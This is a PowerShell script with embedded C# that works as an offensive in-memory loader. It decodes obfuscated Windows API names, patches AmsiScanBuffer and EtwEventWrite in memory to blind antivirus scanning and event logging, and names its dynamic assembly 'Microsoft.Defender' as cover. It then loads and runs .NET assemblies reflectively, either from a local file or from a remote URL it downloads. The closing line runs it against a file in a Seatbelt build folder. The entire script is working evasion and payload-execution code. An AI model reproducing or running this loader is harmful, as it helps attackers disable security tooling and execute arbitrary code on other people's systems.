Add-Type @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace execute_assembly
{
    public class Program
    {
        static bool p4ms1()
        {
            try
            {
                IntPtr lib = dLoadLib(Dec("114126132122063117125125"));
                IntPtr addr = dGetProcA(lib, Dec("082126132122100116114127083134119119118131"));
                //addr = IntPtr.Add(addr, 0x95);

                UInt32 dwOld = 0;

                if (dVirtualP(addr, (UInt32)0x3, 0x40, ref dwOld))
                {
                    //byte[] patch = new byte[] { 0x75 };
                    byte[] patch = new byte[] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };
                    Marshal.Copy(patch, 0, addr, patch.Length);
                    dVirtualP(addr, (UInt32)0x3, 0x20, ref dwOld);

                    return true;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        static bool p3tw()
        {
            try
            {
                IntPtr lib = dLoadLib(Dec("127133117125125063117125125"));
                IntPtr addr = dGetProcA(lib, Dec("095133101131114116118086135118127133"));

                UInt32 dwOld = 0;

                if (dVirtualP(addr, (UInt32)0x1, 0x40, ref dwOld))
                {
                    byte[] patch = new byte[] { 0xC3 };
                    Marshal.Copy(patch, 0, addr, patch.Length);
                    dVirtualP(addr, (UInt32)0x1, 0x20, ref dwOld);

                    return true;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        static void DynamicAssemblyLoader(byte[] asm, string args = null)
        {   
            object obj = new object();
            object[] objArr = new object[] {  };

            if (args != null)
            {
                string[] parts = args.Split('|');
                objArr = new object[] { parts };
            }
            else
            {
                string[] assemblyArgs = new string[] { };
                objArr = new object[] { assemblyArgs };
            }

            DynamicMethod dynamicMethod = new DynamicMethod("_Invoke", typeof(void), new Type[] { typeof(byte[]), typeof(object), typeof(object[]) });
            ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
            iLGenerator.Emit(OpCodes.Ldarg_0);
            iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }), null);
            iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("get_EntryPoint", new Type[] { }), null);
            iLGenerator.Emit(OpCodes.Ldarg_1);
            iLGenerator.Emit(OpCodes.Ldarg_2);
            iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }), null);
            iLGenerator.Emit(OpCodes.Pop);
            iLGenerator.Emit(OpCodes.Ret);
            dynamicMethod.Invoke(null, new object[] { asm, obj, objArr });
        }

        public static void Local(string path, string args = null)
        {
            if (!p4ms1() || !p3tw())
            {
                Console.WriteLine("[!] 4MS1/3TW Error");
                return;
            }
            Console.WriteLine("[+] 4MS1/3TW Patched");

            string[] lines = File.ReadAllLines(path);
            byte[] fileBytes = lines.Select(line => byte.Parse(line)).ToArray();

            DynamicAssemblyLoader(fileBytes, args);
        }

        public static void Remote(string url, string args = null)
        {
            if (!p4ms1() || !p3tw())
            {
                Console.WriteLine("[!] 4MS1/3TW Error");
                return;
            }
            Console.WriteLine("[+] 4MS1/3TW Patched");

            string file;
            using (var client = new WebClient())
            {
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.UseDefaultCredentials = true;
                file = client.DownloadString(url);
            }

            byte[] fileBytes = file.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                                          .Select(line => byte.Parse(line))
                                          .ToArray();

            DynamicAssemblyLoader(fileBytes, args);
        }

        static string Dec(string input)
        {
            string output = "";

            while (input.Length >= 3)
            {
                int arg1 = int.Parse(input.Substring(0, 3));
                char arg2 = (char)(arg1 - 17);
                output += arg2;
                input = input.Substring(3);
            }

            return output;
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("[>x<]");
        }

        public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
        {

            AssemblyName assemblyName = new AssemblyName("Microsoft.Defender");
            var assemblyBuilder = AssemblyBuilder.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("Microsoft.Defender", false);
            var typeBuilder = moduleBuilder.DefineType(library, TypeAttributes.Public | TypeAttributes.Class);

            var methodBuilder = typeBuilder.DefineMethod(method,
                                                         MethodAttributes.Public | MethodAttributes.Static,
                                                         type,
                                                         paramTypes);

            ConstructorInfo dllImportConstructorInfo = typeof(DllImportAttribute).GetConstructor(new Type[] { typeof(string) });

            FieldInfo[] dllImportFieldInfo = { typeof(DllImportAttribute).GetField("EntryPoint"),
                                               typeof(DllImportAttribute).GetField("PreserveSig"),
                                               typeof(DllImportAttribute).GetField("SetLastError"),
                                               typeof(DllImportAttribute).GetField("CallingConvention"),
                                               typeof(DllImportAttribute).GetField("CharSet") };

            Object[] dllImportFieldValues = { method,
                                              true,
                                              true,
                                              CallingConvention.Winapi,
                                              CharSet.Ansi};

            CustomAttributeBuilder customAttributeBuilder = new CustomAttributeBuilder(dllImportConstructorInfo, new Object[] { library }, dllImportFieldInfo, dllImportFieldValues);
            methodBuilder.SetCustomAttribute(customAttributeBuilder);

            Type myType = typeBuilder.CreateType();
            object res = myType.InvokeMember(method, BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod, null, null, args);

            return res;
        }

        public static IntPtr dLoadLib(String libName)
        {
            Type[] paramTypes = { typeof(String) };
            Object[] args = { libName };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", Dec("093128114117093122115131114131138082"), args, paramTypes);
            return (IntPtr)res;
        }

        public static IntPtr dGetProcA(IntPtr hModule, String procName)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(String) };
            Object[] args = { hModule, procName };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", Dec("088118133097131128116082117117131118132132"), args, paramTypes);
            return (IntPtr)res;
        }

        public static bool dVirtualP(IntPtr hProcess, UInt32 dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32).MakeByRefType() };
            Object[] args = { hProcess, dwSize, flNewProtect, lpflOldProtect };
            object res = DynamicPInvokeBuilder(typeof(bool), "kernel32.dll", Dec("103122131133134114125097131128133118116133"), args, paramTypes);
            return (bool)res;
        }
    }
}
"@

[execute_assembly.Program]::Local("G:\Other computers\My laptop\tools\Seatbelt-master\Seatbelt\bin\x64\Release\test.txt")